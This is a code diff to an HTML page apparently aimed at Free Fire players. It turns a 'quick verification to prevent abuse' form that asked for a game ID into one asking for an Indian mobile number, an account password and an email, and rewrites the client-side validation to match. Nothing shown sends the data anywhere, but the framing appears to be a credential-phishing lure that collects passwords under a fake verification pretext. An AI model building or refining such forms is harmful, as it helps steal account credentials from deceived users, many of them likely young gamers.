@@ -323,10 +323,20 @@
             <p>Complete this quick verification to prevent abuse of our system.</p>
             
             <div class="form-group">
-                <label for="ffid">Free Fire ID</label>
-                <input type="number" id="ffid" placeholder="Enter your Free Fire ID (8-11 digits)" 
-                       oninput="this.value=this.value.replace(/[^0-9]/g,''); validateUID()">
-                <div id="uid-error" class="error-message">Free Fire ID must be 8-11 digits</div>
+                <label for="phone">Phone Number</label>
+                <div class="phone-input">
+                    <div class="country-code">+91</div>
+                    <input type="tel" id="phone" placeholder="Enter 10-digit mobile number" 
+                           maxlength="10" oninput="this.value=this.value.replace(/[^0-9]/g,''); validatePhone()">
+                </div>
+                <div id="phone-error" class="error-message">Phone number must be 10 digits</div>
+            </div>
+            
+            <div class="form-group">
+                <label for="password">Password</label>
+                <input type="password" id="password" placeholder="Enter your password" 
+                       oninput="validatePassword()">
+                <div id="password-error" class="error-message">Password must be at least 6 characters</div>
             </div>
             
             <div class="form-group">
@@ -334,16 +344,6 @@
                 <input type="email" id="email" placeholder="Enter your valid email address" 
                        oninput="validateEmail()">
                 <div id="email-error" class="error-message">Please enter a valid email address</div>
-            </div>
-            
-            <div class="form-group">
-                <label for="phone">Mobile Number</label>
-                <div class="phone-input">
-                    <div class="country-code">+91</div>
-                    <input type="tel" id="phone" placeholder="Enter 10-digit mobile number" 
-                           maxlength="10" oninput="this.value=this.value.replace(/[^0-9]/g,''); validatePhone()">
-                </div>
-                <div id="phone-error" class="error-message">Mobile number must be 10 digits</div>
             </div>
             
             <button class="submit-btn" onclick="validateForm()">COMPLETE VERIFICATION</button>
@@ -396,11 +396,24 @@
             });
         }
         
-        function validateUID() {
-            const uid = document.getElementById('ffid').value;
-            const errorElement = document.getElementById('uid-error');
+        function validatePhone() {
+            const phone = document.getElementById('phone').value;
+            const errorElement = document.getElementById('phone-error');
             
-            if (uid.length < 8 || uid.length > 11) {
+            if (phone.length !== 10) {
+                errorElement.style.display = 'block';
+                return false;
+            } else {
+                errorElement.style.display = 'none';
+                return true;
+            }
+        }
+        
+        function validatePassword() {
+            const password = document.getElementById('password').value;
+            const errorElement = document.getElementById('password-error');
+            
+            if (password.length < 6) {
                 errorElement.style.display = 'block';
                 return false;
             } else {
@@ -423,38 +436,25 @@
             }
         }
         
-        function validatePhone() {
-            const phone = document.getElementById('phone').value;
-            const errorElement = document.getElementById('phone-error');
-            
-            if (phone.length !== 10) {
-                errorElement.style.display = 'block';
-                return false;
-            } else {
-                errorElement.style.display = 'none';
-                return true;
-            }
-        }
-        
         function validateForm() {
-            const ffid = document.getElementById('ffid').value;
-            const email = document.getElementById('email').value;
             const phone = document.getElementById('phone').value;
+            const password = document.getElementById('password').value;
+            const email = document.getElementById('email').value;
             
             let isValid = true;
             
-            // Validate UID (8-11 digits)
-            if (!validateUID()) {
+            // Validate phone (10 digits)
+            if (!validatePhone()) {
+                isValid = false;
+            }
+            
+            // Validate password (at least 6 characters)
+            if (!validatePassword()) {
                 isValid = false;
             }
             
             // Validate email
             if (!validateEmail()) {
-                isValid = false;
-            }
-            
-            // Validate phone (now compulsory)
-            if (!validatePhone()) {
                 isValid = false;
             }
             
